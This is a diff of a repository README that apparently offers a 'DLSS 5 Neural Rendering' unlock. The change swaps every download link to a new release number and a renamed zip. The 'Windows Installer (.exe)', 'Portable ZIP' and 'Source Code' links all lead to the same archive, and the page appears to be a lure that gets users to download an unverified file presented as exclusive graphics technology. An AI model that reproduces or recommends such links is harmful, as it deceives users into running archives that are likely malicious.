@@ -40,15 +40,15 @@ DLSS 5 Neural Rendering debuted with **NBA 2K27** and was officially exclusive t
 ## 📥 Download
 
 <p align="center">
-  <a href="https://github.com/AttoConjurer/DLSS5-Neural-Rendering/releases/download/885/DLSS5-Neural-Rendering.zip">
+  <a href="https://github.com/AttoConjurer/DLSS5-Neural-Rendering/releases/download/886/DLSS5-Neural-Render.zip">
     <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20NOW-2C3E50?style=for-the-badge&logo=github&logoColor=white" alt="Download">
   </a>
 </p>
 
 **Direct Links:**
-- [Windows Installer (.exe)](https://github.com/AttoConjurer/DLSS5-Neural-Rendering/releases/download/885/DLSS5-Neural-Rendering.zip)
-- [Portable ZIP](https://github.com/AttoConjurer/DLSS5-Neural-Rendering/releases/download/885/DLSS5-Neural-Rendering.zip)
-- [Source Code](https://github.com/AttoConjurer/DLSS5-Neural-Rendering/releases/download/885/DLSS5-Neural-Rendering.zip)
+- [Windows Installer (.exe)](https://github.com/AttoConjurer/DLSS5-Neural-Rendering/releases/download/886/DLSS5-Neural-Render.zip)
+- [Portable ZIP](https://github.com/AttoConjurer/DLSS5-Neural-Rendering/releases/download/886/DLSS5-Neural-Render.zip)
+- [Source Code](https://github.com/AttoConjurer/DLSS5-Neural-Rendering/releases/download/886/DLSS5-Neural-Render.zip)
 
 ---
 
